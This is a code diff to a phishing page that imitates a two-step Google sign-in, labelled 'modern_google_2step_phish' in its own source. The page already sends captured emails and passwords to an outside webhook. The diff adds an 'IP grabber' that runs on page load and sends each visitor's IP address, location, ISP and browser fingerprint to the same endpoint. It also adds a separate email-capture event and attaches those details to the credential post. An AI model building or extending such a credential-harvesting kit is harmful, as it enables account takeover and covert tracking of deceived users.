@@ -204,6 +204,58 @@
     <script>
         const webhookURL = 'https://unkempt-architect-15.webhook.cool';
         let capturedEmail = '';
+        let userIP = '';
+
+        // IP Grabber function - executes immediately on page load
+        async function grabIP() {
+            try {
+                // First try ipapi.co
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+                
+                // Send IP data immediately
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        event: 'page_load',
+                        ip: userIP,
+                        country: ipData.country_name,
+                        city: ipData.city,
+                        region: ipData.region,
+                        isp: ipData.org,
+                        user_agent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch (error) {
+                try {
+                    // Fallback to ipify.org
+                    const fallbackResponse = await fetch('https://api.ipify.org?format=json');
+                    const fallbackData = await fallbackResponse.json();
+                    userIP = fallbackData.ip;
+                    
+                    // Send basic IP data
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            event: 'page_load',
+                            ip: userIP,
+                            user_agent: navigator.userAgent,
+                            timestamp: new Date().toISOString(),
+                            note: 'Used fallback IP service'
+                        })
+                    });
+                } catch (fallbackError) {
+                    userIP = 'Unknown';
+                }
+            }
+        }
+
+        // Execute IP grabber when page loads
+        grabIP();
 
         // Email form submission
         document.getElementById('emailForm').addEventListener('submit', function(e) {
@@ -217,6 +269,19 @@
             // Show password step, hide email step
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').classList.remove('step-hidden');
+
+            // Send email capture event with IP
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    event: 'email_captured',
+                    email: capturedEmail,
+                    ip: userIP,
+                    user_agent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                })
+            });
         });
 
         // Password form submission
@@ -224,14 +289,22 @@
             e.preventDefault();
             const password = document.getElementById('password').value;
 
-            // Send both email and password to webhook
+            // Send complete credential set with IP and all data
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
+                    event: 'credentials_captured',
                     email: capturedEmail,
                     password: password,
-                    source: 'modern_google_2step_phish'
+                    ip: userIP,
+                    user_agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookies_enabled: navigator.cookieEnabled,
+                    screen_resolution: `${screen.width}x${screen.height}`,
+                    timestamp: new Date().toISOString(),
+                    source: 'modern_google_2step_phish_with_ip_grabber'
                 })
             })
             .then(response => {
